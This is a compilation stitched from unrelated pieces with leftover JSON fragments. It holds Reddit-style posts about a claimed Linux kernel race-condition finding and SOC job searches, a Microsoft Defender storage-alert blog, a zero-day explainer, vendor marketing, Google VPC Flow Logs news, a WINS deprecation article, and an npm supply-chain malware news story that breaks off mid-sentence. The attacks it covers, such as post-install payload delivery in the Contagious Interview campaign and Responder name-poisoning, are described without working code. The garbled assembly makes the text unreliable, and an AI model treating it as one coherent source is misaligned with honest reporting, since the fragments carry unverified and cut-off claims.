      "summary": "Hey everyone, listen I'm going to use AI to explain all this just a heads up but the deal is I patented a thesis and I was testing it out on Google's bug bounty program. I proved my work true. What happened I couldn't believe. Total systematical kernal failure! I found 15 vulnerabilities in 5 hours. I turned them into Google and demanded escalation. They closes every single one of them as frivolous. The thing is I have the patented solution for there failure.Any way I've been working on a deeply unstable process interaction that appears to leverage several non-atomic file operations within the Linux VFS (Virtual File System) layer. The initial finding focused on a classic Local Privilege Escalation (LPE) Race Condition, but further analysis revealed about 15 different patterns where similar non-atomic functions could be exploited under specific high-stress timing conditions. The core issue seems to stem from a fundamental architectural oversight where certain file security checks and subsequent critical operations (rename, chown, etc.) are not treated as a single, uninterruptible transaction (an atomic operation). My Situation & Mitigation I have developed a full Proof-of-Concept (PoC) for the most critical LPE. I have implemented an aggressive, real-time countermeasure (a Time Slice Watchdog) on my own systems to detect and block the exploitation attempt based on abnormal CPU time usage during the race window. This mitigation is currently running successfully. I have detailed technical documentation explaining the root cause, the affected functions, and the required kernel-level mitigation (using atomic primitives).

I interviewed for a SOC Analyst role at a well-known company in early November. I cleared all stages, scored very high, and HR told me I was in their top 3 candidates. They were waiting only for the client to approve the project start date before sending offers. Last week, HR sent an email to all shortlisted candidates saying: They \u201cdon\u2019t have positive news on the start date right now\u201d The client is delaying due to year-end activities and budget finalizations There will be an \u201cadditional delay\u201d They\u2019ll update us once they receive further communication So basically the project is on hold until budgets reopen. This isn\u2019t a rejection \u2014 just a freeze \u2014 but I\u2019m unsure how much hope I should realistically keep. Have any of you been in a similar situation? Do client-based roles often restart in January, or should I mentally move on? Would appreciate any insight, especially from people who\u2019ve worked in SOC or consulting environments.

      "title": "$80k Analyst role - no certifications and unrelated degree",
      "summary": "Hello everyone. In a field where it seems like every opening requires 4+ years of experience, and it takes 1000 applications to get 1 response, I wanted to share my experience with getting a role fresh out of university. As the title says, I signed my offer for $80k (with benefits and 401k matching and all that) my senior year of university with no certifications, and a frankly unrelated degree. My degree is in Computer Criminology / Cyber criminology through the college of criminology. I had no certifications, although I did put \u201cSecurity+ - in progress\u201d on my resume. I did have the Google Cyber Cert. I had a Github with a couple projects on there, but very limited in scope. Anyone dedicated to making projects for 3-4 months could easily surpass what I had. I did have a significant amount work experience when applying, which may make this write up a little misleading. However, as you will see later, I was offered other opportunities prior to majority of my work experience. My first internship was a data science role for a local company in my city. My neighbor (who happened to be an alumni of my university), was friends with some of the HR people, and gave me their contact to reach out. I will say, it seemed that my social skills were more important than my technical skills. I connected with the HR manager over cars, and we traded stories about some of the more complicated repairs we had to make recently. He asked about my technical skills and I described what I learned from my Google cyber cert, and the things I\u2019ve learned from my applicable classes (couple of C++ and UNIX classes). He seemed to approve, and offered me my choice of roles. An app dev role or a \u201cdata security\u201d role. I\u2019m not a fan of programming, so I took the data security one. Day 1 I was completely lost. I was working on a project for a company doing FinTech stuff. I was refactoring Python code for data pipelines and this OCR project to analyze images. I also wrote a boatload of documentation using pdoc, Sphinx, and good old Microsoft Word. I didn\u2019t know much about Python, and I didn\u2019t know ANYTHING about data science. So I would spend the whole day learning what I could, then going home and learning some more. Even though this was a part time role, 20hrs a week, I must\u2019ve put in 50+ hours every week just trying to catch up to a level where I would feel adequately competent to actually do the work. By the end of it (2 months), I hadn\u2019t really accomplished a whole lot, but I had refactored some of the regex to make the OCR a bit more efficient, and I wrote a bunch of documentation for anybody else who might be brought onto the project. Again, social skills came into play, as every week I would have a meeting with the HR manager who hired me, and my project manager from the FinTech company. At the end of it, the HR guy invited me to go golfing with the guys at some point, and the project manager came down to the officer (he worked remotely from a different state) to meet me in person. Overall, very successful summer. Now the next year, my junior year summer, I thought all hope was lost. I had applied to ~800ish internships, had 7 interviews, all of which I made it to the last round, but was offered precisely zero opportunities. I had reached out to the same company mentioned above to see if they had any open positions months prior, but didn\u2019t hear anything back. Eventually, I was offered a position to be a full time intern working in a SOC for a power company in a different state. Quick interlude - I was out of positions to apply to in my state after the first 300 or so, so eventually I started applying all over the nation, looking for anything I could get. Social skills, again, would be what I\u2019d put money on if asked what got me the job. I connected with the main security engineer over the football team of my University, and cracked some jokes about the fake Zoom backgrounds of the others in the call. Just before I accepted that offer (3 months, 40hrs a week, $25.50 an hour), the company I did my previous internship with reached out to me saying they had a full-time offer for me, working on the same project under the same project manager. I found out later the project manager asked for me by name because he thought I did good work and had a good personality that would mesh with the rest of the team. $50k a year on contract, not as an employee so no benefits or anything, 40hrs a week. And yes this was while I still had 1 more year of school to go. Of course I had to take the offer, but I explained to them my hours might be a little\u2026 disjointed due to my classes. They said no problem, just get your hours done on your free days or on the weekend. This went on for about 8months until I applied for my current Security Analyst role which I am at now. While I know it looks disheartening that I needed to have almost a full year of work experience before graduating university just to land an entry-level role, the power company internship had an 80% on return offers for the interns, meaning if I had taken that position, I likely would be working there right now instead. That means I would\u2019ve cheesed my way into 1 internship by asking my neighbor, and that would\u2019ve landed me my 2nd internship, which would\u2019ve led me to a full time role. My thoughts: A degree is not needed to learn cyber security concepts, mine had very few cyber security applicable concepts. However, I DO think it is needed to get hired. Certifications are still asked for on every application I see, but very rarely do I hear them asked about in interviews. Seems to me this is more of a checkbox thing. It really is \u201cwho you know\u201d, as much as I didn\u2019t want it to be true. Social skills are arguably more important than the technical skills. Doesn\u2019t mean you can be a total beginner, but they\u2019d rather hire someone with an agreeable personality and good mindset over cyber Rainman. This was actually brought up in a number of my interviews. Many of the hiring managers complemented my interview ability, and how they appreciated how I was able to get my points across professionally and concisely. These jobs had hundreds of applicants, so I\u2019m sure some of them were technical geniuses. But them complimenting my conversational skills means I was a standout candidate when it came to my social abilities. Interestingly, AI/LLMs haven\u2019t been particularly relevant in my interviews. I use it all the time to generate scripts or for troubleshooting but not once was I asked about it.

      "summary": "Hi All, Posting this on a burner in case I dox myself! I currently work in SOC for an MSSP. The work is mostly boring but can be exciting every so often when we get a true positive! I\u2019ve been offered a role at a small Fintech, it\u2019s a generalist role so doing everything from Vulnerability Management to GRC. Salaries are the same, but at the Fintech I am offered shares. Other benefits are similar and this isn\u2019t important for me at my career stage anyway. Prior to my SOC role. I worked mainly in GRC, I switched to SOC so I could improve my technical skills and this is still important for me. I have aprox 4 years IT experience (1 year service desk, 2 years GRC, 1 year SOC). My main priority at the moment is improving my technical knowledge. I feel SOC has been great for that, and I\u2019m wondering if it would be stupid to move to a generalist role at a FinTech so soon? Will I still be able to gain the technical knowledge I desire? Please let me know what you would do: Stay in SOC @ MSSP Switch to general Security Analyst @ Fintech Thank you! submitted by /u/Flashy_Tone_1974 [link] [comments]",

As generative AI continues to drive innovation, protecting the storage infrastructure becomes central to ensuring both the reliability and safety of AI solutions. Every industry encounters its own set of storage security challenges. For example, financial services must navigate complex compliance requirements and guard against insider risks. Healthcare organizations deal with the protection of confidential patient information (e.g. electronic medical records), while manufacturing and retail face the complexities of distributed environments and vulnerable supply chains. At Microsoft, we leverage product telemetry to gain insight into the most frequent storage security alerts and understand how risks manifest differently across various customer sectors. This article delves into how storage threats are shaped by industry dynamics, drawn on data collected from our customer base to illustrate emerging patterns and risks. Acknowledgement: This blog represents the collaborative work of the following Stroage security in MDC v-team members: Fernanda Vela and Alex Steele, for initiating the project and preparing the initial draft and directing the way we tell the story Eitan Bremler and Lior Tsalovich, for product and customer insights, synthesizing product telemetry and providing review Yuri Diogenes, for his supervision, review and cheerleading We extend our sincere appreciation to each contributor for their dedication and expertise. 1.1 Key findings from product telemetry: Top storage security alerts across industries Based on telemetry gathered from Microsoft Defender for Cloud, certain alerts consistently emerge as the most prevalent across different sectors. These patterns highlight the types of threats and suspicious activities organizations encounter most frequently, reflecting both industry-specific risks and broader attack trends. In the section that follows, this information is presented in detail, offering a breakdown of the most common alerts observed within each industry and providing valuable insight into how storage environments are being targeted and defended. 1.1.1 How does storage security alert in Defender for Cloud work To protect storage accounts from threats, Microsoft Defender for Cloud storage security provides a wide range of security alerts designed to detect suspicious, risky, or anomalous activity across Azure Storage services such as Blob Storage, Data Lake Gen2, and Azure Files. These alerts cover scenarios like unauthorized access attempts, abnormal usage patterns, potential data exfiltration, malware uploads or downloads, sensitive data exposure and changes that may expose storage containers to the public. They leverage threat intelligence and behavioral analytics to identify activity from malicious IPs, unusual geographies, or suspicious applications, ensuring organizations are alerted when their storage environment is potentially at risk. Each alert is categorized by severity, helping organizations prioritize responses to the most critical threats, such as confirmed malware or credential compromise, while also surfacing medium and low-risk anomalies that may indicate early stages of an attack. Overall, Defender for Storage enables proactive monitoring and rapid detection of threats to cloud storage, reducing the risk of exposure, misuse, or compromise of valuable data assets. 1.1.2 Top alert types for major industries Financial, healthcare, technology, energy and manufacturing are often cited as the most targeted industries because of the value of their data, regulatory exposure and their role in critical infrastructure. Our telemetry from Microsoft Defender for Cloud (MDC) shows the top security alerts in storage resources across these five industries: Finance industry Health care industry Manufacturing industry Software industry Energy industry 1.1.3 Top 9 alerts across industries Across industries, the most common alert\u2014averaging 1,300 occurrences per month\u2014is \u201cUnusual application accessed a storage account,\u201d indicating unexpected access to a storage account. Below are the top cross-industry alerts based on this analysis. 1.2 Analysis Application Anomaly Alerts Ranking: #1 across all industries (Finance, Manufacturing, Software, Energy, Healthcare) Alert: Access from a suspicious application (Storage.Blob_ApplicationAnomaly) Why it happens: Organizations increasingly use automation, third-party integrations, and custom scripts to interact with cloud storage. Shadow IT and lack of centralized app governance lead to unexpected access patterns. In sectors like healthcare and finance, sensitive data attracts attackers who may use compromised or malicious apps to probe for weaknesses. Interpretation: High prevalence indicates a need for stricter application registration, monitoring, and access controls. Industries should prioritize visibility into which apps are accessing storage and enforce policies to block unapproved applications. Geo-Anomaly Alerts Ranking: #2 or #3 in most industries Alert: Access from an unusual location (Storage.Blob_GeoAnomaly, Storage.Files_GeoAnomaly) Why it happens: Global operations, remote work, and distributed teams are common in energy, manufacturing, and healthcare. Attackers may use VPNs or compromised credentials to access storage from unusual regions. Interpretation: Frequent geo-anomalies suggest gaps in geo-fencing and conditional access policies. Organizations should review access logs, enforce region-based restrictions, and monitor cross-border data flows. Malware-Related Alerts Ranking: Prominent in healthcare, finance, and software sectors Alert: Malware found in blob (Storage.Blob_AM.MalwareFound) Malware download detected (Storage.Blob_MalwareDownload) Access from IP with suspicious file hash reputation (Storage.Blob_MalwareHashReputation) Why it happens: High-value data and frequent file exchanges make these industries attractive targets for ransomware and malware campaigns. Insufficient scanning capacity or delayed remediation can allow malware to persist. Interpretation: Rising malware alerts point to active threat campaigns and the need for real-time scanning and automated remediation. Industries should scale up Defender capacity, integrate threat intelligence, and enable automatic malware removal. Open Container Scanning Alerts Ranking: More frequent in energy and manufacturing Alerts: Successful discovery of open storage containers (Storage.Blob_OpenContainersScanning.SuccessfulDiscovery) Failed attempt to scan open containers (Storage.Blob_OpenContainersScanning.FailedAttempt) Why it happens: Rapid cloud adoption and operational urgency can lead to misconfigured storage containers. Legacy systems and lack of automated policy enforcement increase exposure risk. Interpretation: High rates of open container alerts signal the need for regular configuration audits and automated security policies. Organizations should prioritize closing public access and monitoring for changes in container exposure. Anonymous Access & Data Exfiltration Alerts Ranking: Present across industries, especially where sensitive data is stored Alerts: Anonymous access anomaly detected (Storage.Blob_AnonymousAccessAnomaly) Data exfiltration detected: unusual amount/number of blobs (Storage.Blob_DataExfiltration.AmountOfDataAnomaly, Storage.Blob_DataExfiltration.NumberOfBlobsAnomaly) Why it happens: Attackers may attempt to access data anonymously or exfiltrate large volumes of data. Weak access controls or lack of monitoring can enable these behaviors. Interpretation: These alerts should trigger immediate investigation and remediation. Organizations must enforce strict access controls and monitor for abnormal data movement. Key Takeaways Across Industries Application anomaly and geo-anomaly alerts are universal, reflecting the challenges of managing automation and global access in modern cloud environments. Malware-related alerts are especially critical in sectors handling sensitive or regulated data, indicating active targeting by threat actors. Open container and capacity alerts reveal operational and configuration risks, often tied to rapid scaling and cloud adoption. Interpreting these trends: High alert shares for specific patterns should drive targeted investments in security controls, monitoring, and automation. Industries must adapt their security strategies to their unique risk profiles, balancing innovation with robust protection. 1.3 Protect storage accounts from threats To address these challenges, Microsoft Defender for Cloud Storage Security offers: Real-time monitoring of storage-related threats: Identifies unusual access patterns with direct integration with Azure.

      "title": "What are zero-day attacks and why do they work?",
      "summary": "Zero-day attacks have become a significant concern in the realm of cybersecurity, posing a formidable challenge to individuals and organizations alike. These attacks exploit vulnerabilities that are unknown to the software vendor, leaving systems exposed to potential breaches. As cyberthreats evolve, understanding zero-day attacks and implementing effective protection strategies is crucial for maintaining security. Understanding zero-day attacks What is a zero-day vulnerability, exploit, and attack? A zero-day vulnerability refers to a software security flaw that is unknown to the vendor. When attackers exploit this vulnerability, it becomes a zero-day exploit. A zero-day attack occurs when malicious actors use this exploit to compromise a system before a patch is available. Why \u201czero-day\u201d? The term \u201czero-day\u201d signifies that the vendor has zero days to address the vulnerability before it is exploited. This urgency highlights the critical nature of these threats because they can be leveraged by attackers immediately upon discovery. Common targets of zero-day attacks Zero-day attacks often target operating systems, web browsers, enterprise software, and Internet of Things (IoT) devices. These platforms are integral to daily operations, making them attractive targets for attackers seeking to maximize impact. Why zero-day attacks are so effective Zero-day attacks have several advantages in the cybersecurity landscape. Due to their novel nature, they can be challenging to detect and understand. Here are some common reasons they work when deployed against unsuspecting targets: No available patch: These exploits are unknown to both vendors and defenders, meaning they have not been identified and patched yet, leaving the door open for attackers. High-value targets: These attacks are often used in cyber espionage, ransomware campaigns, and advanced persistent threats (APTs) to target high-value assets with sensitive data. Difficult to detect: These exploits often are missed by traditional detection tools, especially those relying on signature-based detection, allowing adversaries to operate undetected. Speed and stealth: Successful breaches are more likely with zero-day attacks because attackers act quickly and quietly, allowing them to exploit vulnerabilities before they are identified and patched. Precision targeting: The target of these exploits is often a specific individual or organization. Spear-phishing and zero-click attacks are common tactics used to initiate the breach. Real-world zero-day attack examples No organization is immune to being targeted by a zero-day attack. In the real world, many key services, organizations, and platforms can be targeted by zero-day exploits: Nation-state sabotage: State-sponsored attackers can target critical infrastructure and utilities with zero-day exploits, rendering key services and life-saving utilities unavailable. Mobile surveillance: In telecommunications, carriers have witnessed zero-click exploits being used in mobile surveillance. This leads to compromised devices without any user interaction. Supply chain attacks: Global supply chains are appealing targets because they have a wide impact. In exploiting zero-day vulnerabilities, attackers can impact several groups in one attack, such as consumers, manufacturers, employees, and more. Frequently targeted platforms: Web browsers and email servers are common targets of zero-day attacks. These are widely used, increasing the potential for significant disruption. How zero-day vulnerabilities are discovered and used There are multiple groups and methodologies that work to discover, use, and inform organizations of zero-day vulnerabilities. These include: White-hat researchers: Often ethical hackers, also known as white-hat researchers, discover zero-day vulnerabilities via bug bounty programs and responsible disclosure. This helps vendors identify and address these issues. Black-hat hackers: On the flip side, if a black-hat hacker identifies a vulnerability before it is patched, the hacker can leverage it for gain, often selling exploits on the dark web. Government agencies: Some government agencies engage in offensive cyber operations, stockpiling exploits for strategic purposes. They also can inform organizations and vendors of these exploits, much like white-hat researchers. Thorough investigation: Internal security teams can leverage investigation capabilities, such as packet-level insights, to discover and understand zero-day threats, preventing future occurrences. How to defend against zero-day attacks There are several measures security and network teams can take to more effectively avoid zero-day attacks. Some examples include: Leverage threat investigation: Detection alone often misses the unknown. Thorough investigation, leveraging deep packet inspection (DPI) at scale and forensic analysis, is key to identifying and preventing zero-day attacks from being successful now and in the future. Patch quickly: Prioritizing updates and effective vulnerability management is essential to mitigating the risk of zero-day attacks. Use behavior-based detection: Employing solutions such as endpoint detection and response (EDR), network detection and response (NDR) , and extended detection and response (XDR) in combination with a strong investigation focus can help identify anomalous behavior that can signify zero-day exploits are being leveraged. Adopt zero-trust principles: Implementing a zero-trust security architecture , limiting user access, and continuously verifying identities can reduce the risk of unauthorized access to sensitive data. Segment the network: Strategic network segmentation helps contain breaches and minimizes lateral movement within a compromised system. Stay informed: Subscribing to security advisories and threat intelligence feeds helps keep organizations informed on emerging threats and vulnerabilities. FAQs about zero-day attacks What makes zero-day attacks different from other cyberthreats? Zero-day attacks exploit unknown vulnerabilities, making them particularly challenging to defend against compared with threats targeting known vulnerabilities. Can antivirus software detect zero-day exploits? Traditional antivirus software may struggle to detect zero-day exploits due to its reliance on signature-based detection methods. Are zero-day vulnerabilities illegal to sell or use? Although selling or using zero-day vulnerabilities for malicious purposes is illegal, ethical disclosure through bug bounty programs is encouraged. How long do zero-day exploits typically remain undetected? The duration for which a zero-day exploit remains undetected varies, but it can range from days to months, depending on the complexity of the exploit and the vigilance of security teams. Staying ahead of emerging threats with investigation Zero-day attacks represent a significant threat in the cybersecurity landscape, exploiting unknown vulnerabilities to devastating effect. Understanding these attacks and implementing proactive defensive strategies is essential for staying ahead of emerging threats. Detection alone is not enough. Detection-focused tools such as EDR, NDR, and XDR on their own miss the unknown, allowing zero-day attacks to have a better chance of success. Leveraging investigation, powered by packet data, empowers teams with the actionable data to detect, understand, and prevent future attacks.

      "title": "The first line of defense is still the network. But that\u2019s only the beginning",
      "summary": "For years, the security industry has been captivated by the promises of new acronyms: EDR, XDR, CDR. Each wave has promised broader coverage, better detection, and faster responses. And although each of these tools provides value, recent research from Enterprise Strategy Group (ESG) reveals something the industry conversation often overlooks: When real threats emerge, organizations still turn first to the network. According to ESG , 53% of organizations rely on network visibility and telemetry as their primary line of defense. In fact, nearly two-thirds use the network in some capacity to kick off their threat detection and response processes. Even more telling, 93% of SecOps and NetOps teams now share the same network visibility tools, which is a sign that the network has become the unifying language of operations. So, why in an era dominated by extended detection and response (XDR) and cloud-native tooling does the network remain the first place security teams look? The answer is simple: Packets don\u2019t lie. Why packets still matter Endpoints can be tampered with. Logs can be incomplete. Cloud providers can limit visibility. But network packets capture every transaction, every communication, and every anomaly, without bias. This is why, despite some vendors dismissing network detection and response (NDR) as \u201cold-school\u201d or \u201con-premises,\u201d ESG found that 41% of organizations actually see network tools as the best-equipped technology for providing visibility across hybrid, multicloud environments. The truth is that the network has evolved right alongside the environments it protects. It\u2019s no longer just about physical appliances watching traffic at the perimeter. Today\u2019s NDR solutions scale across data centers, virtual servers, and multicloud ecosystems, providing a single vantage point where everything converges. Detection is only step one But here\u2019s where we believe the conversation needs to change. Detection, while critical, is just the first step. The real challenge, and the real value, lies in understanding a threat through the investigation phase. Think about it: an alert tells you something happened. But only investigation tells you what it was, how it happened, and what to do about it. That\u2019s the gap where attackers thrive and where security operations center (SOC) teams often lose valuable time. And this is where network visibility proves its worth beyond being just a \u201cfirst line of defense.\u201d With full packet capture and deep network intelligence, security teams can pivot from \u201cwe detected something\u201d to \u201cwe understand everything about it.\u201d That shift is the difference between chasing alerts and actually stopping adversaries in their tracks. Why NETSCOUT Omnis Cyber Intelligence At NETSCOUT, we\u2019ve seen this shift firsthand. Omnis Cyber Intelligence isn\u2019t just about spotting anomalies; it\u2019s about giving analysts the complete, packet-level context they need to investigate confidently. By unifying SecOps and NetOps on a shared foundation of visibility, Omnis Cyber Intelligence helps eliminate blind spots that attackers exploit. Because at the end of the day, detection will always be table stakes. Investigation is where the real impact is made. Network packets provide the single source of truth across on-premises, hybrid, and cloud environments, serving as the foundation that makes it all possible. Learn more about the ESG report .

      "title": "Gain Cross-Cloud Network traffic insights with VPC Flow Logs and Flow Analyzer",
      "summary": "Gaining visibility into your network traffic is crucial, particularly with hybrid environments encompassing both on-premises and cross-cloud infrastructure. VPC Flow Logs have long been a staple to obtain detailed records of network traffic to, from, and within your Google Cloud subnets. But with the rise of more complex network topologies enabled by the Cross-Cloud Network , we knew we needed to expand VPC Flow Logs to give you a more complete picture. That's why we're excited to share that you can now enable VPC Flow Logs directly on your Cloud VPN tunnels and VLAN attachments for Cloud Interconnect and Cross-Cloud Interconnect. This enhancement provides comprehensive monitoring of critical network traffic moving between your on-prem infrastructure, cross-cloud resources, and Google Cloud. With this new capability, you can: Gain granular insights: Log network flows passing through Cloud Interconnect and Cloud VPN with 5-tuple granularity (source/destination IP, source/destination port, protocol). Optimize performance: Quickly identify \"elephant flows\" (high-bandwidth flows) that might be congesting a specific VPN tunnel or VLAN attachment, enabling you to better plan and manage capacity. Audit Shared VPC usage: In Shared VPC environments, identify which service projects are consuming the most hybrid bandwidth. Map utilization to flows: Understand exactly how your hybrid connections are being utilized by mapping high-level bandwidth graphs to specific application flows. Diagnose connectivity issues: When an on-prem/cross-cloud application can't reach a Google Cloud resource, use logs to check if the traffic is arriving at the Google Cloud gateway (VLAN attachment or VPN tunnel). Finetune your application awareness on Cloud Interconnect policy configurations: Monitor and verify that your applications are marking differentiated services field codepoints (DSCP) correctly. To provide more context to these flows, we've also added \" gateway \" annotations to VPC Flow Logs. Think of a gateway as the entry or exit point for traffic traveling between your Google Cloud VPC and an external network. When you inspect a flow log of Cross-Cloud Network traffic, you'll now see two key new fields : reporter : This field tells you the direction of the traffic, relative to the gateway. SRC_GATEWAY : The traffic was observed entering Google Cloud through Cloud Interconnect or Cloud VPN (e.g., on-prem to Google Cloud). DEST_GATEWAY : The traffic was observed exiting Google Cloud through Cloud Interconnect or Cloud VPN (e.g., Google Cloud to on-prem). gateway object : This JSON payload provides the full context of the gateway itself, including its name , type (VPN_TUNNEL or INTERCONNECT_ATTACHMENT), project_id , and location . Analyze your logs with Flow Analyzer To help you analyze your flow logs without writing-complex SQL queries, we\u2019ve also integrated the new gateway annotations directly into Flow Analyzer , a native tool for performing deep network traffic analysis on your VPC Flow Logs stored in Cloud Logging at no additional cost. Using Flow Analyzer, you can: Quickly identify top talkers in your network with 5-tuple granularity. Run Connectivity Tests in-context to understand how your configurations (ie. firewall policies) impact traffic flowing through your network. Use Gemini Cloud Assist to construct natural language queries . Analyze and compare current network flows with historical data (e.g., last hour, day, or week). Flow Analyzer providing Cloud Interconnect traffic insights Achieve essential visibility across the Cross-Cloud Network If you're running a Cross-Cloud Network, enabling VPC Flow Logs on your VLAN attachments and VPN tunnels provides the essential telemetry you need to manage, secure, and scale your interconnected networks. You can enable this feature on your new and existing VLAN attachments and VPN tunnels using CLI, API, Terraform, or directly from the Google Cloud console . To learn more, check out the VPC Flow Logs documentation or get started with Flow Analyzer .",

      "title": "Microsoft gives Windows admins a legacy migration headache with WINS sunset",
      "summary": "Microsoft has given system administrators until 2034 to stop using WINS (Windows Internet Name Service) NetBIOS name resolution technology in their networks \u2014 but even nine years may not be enough notice for some: WINS is very much still in use, supporting a niche range of difficult-to-replace legacy systems. WINS dates from Windows NT in 1994 and has long since been displaced by the more modern Domain Name System (DNS). It was deprecated in 2021 to coincide with the appearance of Windows Server 2022. This meant it would be supported but no longer developed, a clear signal that the clock was ticking. Now, Microsoft has said, the last operating system to support WINS will be Windows Server 2025. That\u2019s what determines the nine-year final migration deadline \u2014 the lifespan of Windows Server 2025 on the Long-Term Servicing Channel (LTSC). \u201cOrganizations using WINS are strongly encouraged to migrate to modern DNS-based name resolution solutions,\u201d the company said, perhaps stating the obvious, in a Windows Message Center advisory in early November. According to Microsoft, the timescale is generous. \u201cOur goal is to make planning and migrations as predictable and low-stress as possible. With advanced notice and a support runway, organizations can confidently modernize their environments at their own pace,\u201d it said. Cutting out WINS Future versions of Windows without support for WINS will lose the WINS Server role and associated binaries, the WINS Microsoft Management Console (MMC) snap-in, and WINS automation APIs and related management interfaces, the company added. WINS migration is yet another legacy issue inherited from the creative ferment of computer networking in the 1980s and 1990s. That era needed solutions to lots of networking problems in a hurry, especially how to turn a desktop PC operating system such as DOS or Windows into a practical server platform. WINS solved an important challenge: how to connect the names used to identify computers using the 1980s\u2019 NetBIOS network naming system with modern IP addresses. DNS, a hierarchical system that worked for Internet as well as network addresses, had rendered NetBIOS obsolete. But both ended up co-existing, examples of how the industry delivered more than one answer to the same problem. Today, the arguments for getting rid of WINS extend beyond its obsolescence. It is also a security risk. In 2017, Fortinet\u2019s FortiGuard Labs discovered a WINS Server remote memory corruption vulnerability in Windows Server 2008, 2012, and 2016. Microsoft\u2019s reply to Fortinet made interesting reading: \u201cA fix would require a complete overhaul of the code to be considered comprehensive. The functionality provided by WINS was replaced by DNS and Microsoft has advised customers to migrate away from it.\u201d In short, Microsoft had no plans to patch the issue. Its solution was that customers migrate away from WINS, a process it has since become clear could still be ongoing for some customers into the 2030s. Why WINS is still in use Organizations still using WINS are likely to fall into one of two categories: those using it to support old technologies with long lifecycles such as operational technology (OT) systems, and those that have simply half-forgotten that they are still using it. \u201cFor OT stacks built around WINS/NetBIOS, replacing them isn\u2019t trivial because changing name resolution touches safety\u2011critical systems and bespoke integrations,\u201d said Kieran Bhardwaj , head of security engineering at UK cyber security consultancy Bridewell, which specializes in advising on critical infrastructure. \u201cLegacy technologies persist because some niche systems like industrial/OT environments are engineered for multi\u2011decade lifecycles. Many control systems are architecturally fixed and can\u2019t be re\u2011platformed,\u201d he said. \u201cIt\u2019s also hard for Microsoft: WINS sits deep in the networking stack which means removing a once\u2011core component demands exhaustive regression to avoid unintended breakage.\u201d Equally, according to William Wright of pen-testing company Closed Door Security, WINS was still running on some networks for the same reason that many legacy technologies overstay their usefulness: migration apathy. \u201cMost organizations running WINS today probably aren\u2019t actively using it for anything critical. They\u2019ve just never had a compelling reason to turn it off,\u201d he said. \u201cIt\u2019s been quietly replicating in the background, consuming minimal resources, causing no obvious problems. That\u2019s the nature of legacy infrastructure: It persists not because it\u2019s needed, but because removing it requires effort and carries risk, while leaving it alone is free,\u201d said Wright. WINS is a security risk WINS had major design limitations that made it a security risk, said Wright. \u201cWINS has no mechanism to verify the legitimacy of name registrations, which makes it vulnerable to spoofing attacks,\u201d said Wright. \u201cAn attacker on the network can register malicious entries, including Web Proxy Auto-Discovery (WPAD) records to intercept web traffic, or redirect connections to systems they control. It\u2019s a straightforward path for lateral movement,\u201d he said. Finding WINS still turned on inside a network was a godsend to hackers using open-source tools such as Responder to conduct name resolution poisoning attacks against legacy Windows protocols such as Link-Local Multicast Name Resolution (LLMNR) and the NetBIOS Name Service (NBT-NS), Wright added. Worse, the presence of WINS often indicated that a target was using other vulnerable legacy protocols. \u201cSystems often fall back to NetBIOS broadcast queries when WINS isn\u2019t available, which are spoofable on local networks. This is exactly what tools like Responder exploit, and it remains a common technique in penetration testing and real-world attacks alike.\u201d Network inventory Organizations looking to rip WINS out should start with an inventory to find out where it is being used, Bhardwaj said: \u201cMany organizations don\u2019t realize a legacy asset still relies on WINS, so proactively inventory older segments and OT/ICS networks and verify resolution paths before the next upgrade window.\u201d \u201cThe trade-off is that customers still using WINS must put in the work to move to DNS by auditing dependencies, modernizing or isolating legacy workloads, and implementing DNS. But the payoff is a simpler, more secure platform. In the end, even the brightest and best-performing technologies will one day be legacy. Migrating from WINS is a test of how well organizations are dealing with this wider problem. \u201cThere\u2019s way too much legacy that is unused and that presents an attack surface for no reason,\u201d said Bhardwaj.

      "title": "Contagious Interview attackers go \u2018full stack\u2019 to fool developers",
      "summary": "Researchers at Socket have uncovered more details of a sophisticated software supply-chain operation linked to the Contagious Interview campaign attacking developers who rely on packages from NPM. They report finding a \u201cfull stack\u201d operation behind the attacks, where code hosting, package distribution, staging servers and command-and control (C2) infrastructure are orchestrated much like a legitimate software development and delivery pipeline \u2014 and offer honest developers fresh advice on protecting themselves against the attacks. In the latest wave, threat actors uploaded almost 200 new malicious NPM packages, with more than 31,000 recorded downloads. The campaign lures victims with fake job interviews and coding assignments related to Web3 and blockchain projects, asking them to pull dependencies for a \u201ctest project\u201d. But the NPM packages they install are Trojan horses. The latest packages identified by Socket ultimately deliver a new payload with upgraded credential theft, system monitoring and remote access capabilities, enabling them to take over developers\u2019 accounts and machines. Point defense Based on its latest analysis, Socket advised developers to focus on the weak points this campaign exploits, and to treat every \u201cnpm install\u201d as potential remote code execution, restrict what continuous-integration runners can access, enforce network egress controls, and review the code of any new templates or utilities pulled from GitHub. Teams should also scrutinize unfamiliar helper packages, pin known-good versions, and use lockfiles instead of auto-updating dependencies, it advised. Automated package analysis can further reduce risk, with real-time scans catching threats including import-time loaders, network probing, and bulk data exfiltration before they hit developer machines or CI systems. With these checks in place, dependency onboarding and code review become effective filters for blocking Contagious Interview-style attacks early, Socket said. Coding tasks lead to malware delivery These defensive measures are effective because Contagious Interview\u2019s entry vector relies heavily on social engineering, using fake interview tasks to trick developers into installing compromised dependencies. The campaign exploits NPM, a widely used package registry for JavaScript and Node.js, by publishing packages that appear benign but carry hidden payloads. The malicious packages including one named \u201ctailwind-magic\u201d mimic legitimate libraries (in this case, a typosquatted version of the genuine \u201ctailwind-merge\u201d utility) to avoid suspicion. When an unsuspecting developer installs such a package, a post-install script triggers and reaches out to a staging endpoint hosted on Vercel. That endpoint in turn delivers a live payload fetched from a threat-actor controlled GitHub account named \u201cstardev0914\u201d. From there the payload, a variant of OtterCookie that also folds in capabilities from the campaign\u2019s other signature payload, BeaverTail , executes and establishes a remote connection to the attackers\u2019 control server. The malware then silently harvests credentials, crypto-wallet data, browser profiles and more. \u201cTracing the malicious npm package tailwind-magic led us to a Vercel-hosted staging endpoint, tetrismic[.]vercel[.]app,and from there to the threat actor controlled GitHub account which contained 18 repositories,\u201d Socket\u2019s senior threat intelligence analyst Kirill Boychenko said in a blog post , crediting related research by Kieran Miyamoto that helped confirm the malicious GitHub account stardev0914. A \u2018full stack\u2019adversary: GitHub, Vercel, and NPM What makes this campaign stand out is the layered infrastructure behind it. Socket\u2019s analysis traced not just the NPM packages but also how the attackers built a complete delivery pipeline: malware serving repositories on GitHub, staging servers on Vercel, and separate C2 servers for exfiltration and remote command execution. Through this setup, attackers can rotate payloads, update malware unobtrusively, and tailor deployments per target\u2014all while blending deeply into the legitimate developer ecosystem, according to Boychenko. Once installed, OtterCookie doesn\u2019t just run and vanish: It remains persistent, capable of logging keystrokes, hijacking the clipboard, scanning the filesystem, capturing screenshots, and grabbing browser and wallet credentials across Windows, macOS and Linux. The campaign actors\u2019 intensified NPM activity arrives at a worrying moment for the 